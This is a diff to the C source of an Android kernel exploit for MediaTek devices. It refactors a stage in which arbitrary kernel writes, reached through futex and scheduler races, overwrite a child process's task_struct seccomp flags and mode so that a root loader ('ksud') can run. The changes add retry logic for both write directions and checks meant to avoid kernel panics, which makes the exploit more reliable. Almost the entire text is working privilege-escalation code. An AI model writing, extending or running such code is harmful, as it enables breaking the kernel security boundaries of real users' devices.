@@ -37,7 +37,10 @@ static int soc_is_mtk(void) {
       return 0;
     }
   }
-  const char *keys[] = {"ro.soc.model", "ro.board.platform", NULL};
+  const char *keys[] = {
+    "ro.soc.model", "ro.board.platform", "ro.mediatek.platform",
+    "ro.hardware", NULL,
+  };
   for (int i = 0; keys[i]; i++) {
     if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
       continue;
@@ -256,12 +259,11 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         errno = 0;
         long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
         if (sched_ret != 0) {
+          /* Unblock the owner PI chain only; do not count as route success. */
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
-          if (fret == 0) {
+          if (fret == 0)
             futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-            sched_ret = 0;
-          }
         }
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
         atomic_store(&consumer_inflight, 0);
@@ -851,6 +853,75 @@ static int verify_leaf_dir_stage(void *context) {
   return 0;
 }
 
+static int child_still_alive(pid_t child) {
+  int st = 0;
+  return waitpid(child, &st, WNOHANG) == 0;
+}
+
+static void w3_compute_targets(uintptr_t child_task, int leaf_to_target8,
+                               uintptr_t *flags_target,
+                               uintptr_t *mode_target) {
+  if (leaf_to_target8) {
+    *flags_target = child_task - 8;
+    *mode_target = child_task + TASK_SECCOMP_OFF - 8;
+  } else {
+    *flags_target = child_task + TASK_THREAD_INFO_FLAGS_OFF;
+    *mode_target = child_task + TASK_SECCOMP_OFF;
+  }
+}
+
+/* Try one leaf-write side for W3.  Skips the mode write if the child dies
+ * after the flags write to avoid compounding a bad flags hit. */
+static int try_w3_seccomp_direction(pid_t child,
+                                    struct w2_stage_context *w2_ctx,
+                                    uintptr_t child_task, int leaf_to_target8,
+                                    int attempts) {
+  uintptr_t flags_target, mode_target;
+  w3_compute_targets(child_task, leaf_to_target8, &flags_target, &mode_target);
+  pr_info("W3 direction leaf_to_target8=%d flags=0x%016zx mode=0x%016zx\n",
+          leaf_to_target8, flags_target, mode_target);
+
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    pr_info("W3: TIF_SECCOMP+mode attempt %d/%d (dir=%d)\n", attempt, attempts,
+            leaf_to_target8);
+    if (attempt == 1) slab_drain();
+
+    if (!child_still_alive(child)) {
+      pr_warning("W3: child gone before attempt %d\n", attempt);
+      return 0;
+    }
+
+    int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
+    if (!routed) {
+      pr_warning("W3 attempt %d flags route failed; backing off\n", attempt);
+      usleep(100000);
+      continue;
+    }
+    usleep(100000);
+
+    if (!child_still_alive(child)) {
+      pr_warning("W3: child died after flags write; skipping mode write\n");
+      return 0;
+    }
+
+    routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
+    if (!routed) {
+      pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+      usleep(100000);
+      continue;
+    }
+    usleep(100000);
+
+    if (!child_still_alive(child)) {
+      pr_warning("W3: child died after mode write\n");
+      return 0;
+    }
+    if (verify_seccomp_probe_stage(w2_ctx)) return 1;
+    usleep(100000);
+  }
+  return 0;
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
@@ -973,51 +1044,29 @@ int run_exploit(int argc, char **argv) {
 
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = 1,
+      .leaf_to_target8 = 0,
     };
     int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 6, 50000,
         verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+
+    if (dir_ok) {
+      seccomp_ok = try_w3_seccomp_direction(
+          child, &w2_context, child_task, w3_context.leaf_to_target8, 4);
+    } else {
+      /* Without a comm probe, prefer the [target] side first: the [target+8]
+       * layout writes through child_task-8, which panics the kernel when the
+       * side guess is wrong. */
+      pr_warning("W3 leaf direction probe failed; trying [target] side first\n");
+      seccomp_ok = try_w3_seccomp_direction(child, &w2_context, child_task, 0, 3);
+      if (!seccomp_ok && child_still_alive(child)) {
+        pr_info("W3: [target] side failed; trying [target+8] side\n");
+        seccomp_ok = try_w3_seccomp_direction(child, &w2_context, child_task, 1,
+                                              3);
+      }
     }
 
-    uintptr_t flags_target = w3_context.leaf_to_target8
-      ? child_task - 8
-      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
-    uintptr_t mode_target = w3_context.leaf_to_target8
-      ? child_task + TASK_SECCOMP_OFF - 8
-      : child_task + TASK_SECCOMP_OFF;
-
-    for (int attempt = 1; attempt <= 6; attempt++) {
-      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
-      if (attempt == 1) slab_drain();
-      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
-      if (!routed) {
-        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
-        usleep(100000);
-        continue;
-      }
-      usleep(50000);
-      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
-      if (!routed) {
-        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
-        usleep(100000);
-        continue;
-      }
-      usleep(50000);
-      int st = 0;
-      if (waitpid(child, &st, WNOHANG) == child) {
-        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-        child_alive = 0;
-        break;
-      }
-      if (verify_seccomp_probe_stage(&w2_context)) {
-        seccomp_ok = 1;
-        break;
-      }
-      usleep(50000);
-    }
+    if (!seccomp_ok && !child_still_alive(child)) child_alive = 0;
 
     if (!seccomp_ok) {
       pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
